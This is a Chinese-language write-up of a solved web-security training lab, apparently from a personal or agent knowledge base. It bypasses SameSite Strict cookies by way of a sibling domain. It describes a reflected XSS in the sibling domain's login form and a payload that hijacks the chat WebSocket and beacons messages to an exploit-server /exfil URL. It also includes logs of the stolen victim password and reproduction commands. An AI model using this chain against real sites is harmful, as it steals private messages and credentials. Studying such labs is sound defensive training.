---
title: "lab-samesite-strict-bypass-via-sibling-domain"
links:
  - target: csrf-family
    relation: evidences
---

# lab-samesite-strict-bypass-via-sibling-domain

> evidences: [[csrf-family]]

- 题面:SameSite Strict bypass via sibling domain(/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain)
- 实例:https://0ad9003c04bf12e382c30b5100db00ed.web-security-academy.net
- 利用服务器:https://exploit-0aa400fe0430123682870a5601360003.exploit-server.net
- 判定目标:登录受害者账号;状态:**solved**(横幅 `Congratulations, you solved the lab!`)

## 链

1. 主站有 `/chat`(live chat),`/resources/js/chat.js` 在打开时向 `wss://<主站>/chat` 发 `READY`,
   之后每条历史以 `{"user":...,"content":...}` 帧下发。会话 cookie `session` 为 `SameSite=Strict`。
2. 同站兄弟域 `cms-<instance>.web-security-academy.net`(同 registrable domain → same-site)存在
   **POST `/login` 的 username 反射 XSS**:`Invalid username: <our input>` 不回显转义。
3. 利用服务器存 `/exploit` 页面:自动提交表单 POST 到兄弟域 `/login`,`username` 值为
   `<script>...` 载荷;载荷打开 `wss://<主站>/chat`(同站 → Strict 会话 cookie 随握手发送),
   发 `READY`,把每帧回传到 `https://exploit-.../exfil?d=<encodeURIComponent(e.data)>`(Image 信标)。
4. `formAction=DELIVER_TO_VICTIM` 交付。读 exploit `/log` 得到聊天历史:
   `Hal Pline: "No problem carlos, it's d22z7q386746ttmvg8xc"` → 受害者 `carlos` 的密码。
5. 用该密码登录主站 → solved。

## 证据摘录

```
POST cms-<id>/login (username=<b>) -> "Invalid username: zqmarkerb<b>"  (反射 XSS)
exploit log: GET /exfil?d={"user":"Hal Pline","content":"No problem carlos, it's d22z7q386746ttmvg8xc"}
lab_http post <inst>/login (carlos / d22z7q386746ttmvg8xc) -> 302 /my-account?id=carlos
```

## 复现命令

```
lab_launch launch 44CCA99334D60D91033BF4BD0908A142896514AF0A3C0C343F8017FE71781AE9 --widget-source /web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain --jar /tmp/b10-jar4.json
# 1) exploit server STORE+DELIVER:responseBody 为自动提交到 cms-<id>/login 的表单,username 传 XSS 载荷
# 2) 读 https://exploit-<id>.exploit-server.net/log 取聊天历史里的凭据
lab_http get "<inst>/login" --jar /tmp/b10-jar4.json --out /tmp/login.html   # 取与 session 绑定的 csrf
lab_http post "<inst>/login" --form csrf=<csrf> --form username=carlos --form password=<pw> --jar /tmp/b10-jar4.json
solved_check "<inst>" --jar <clean-jar>
```
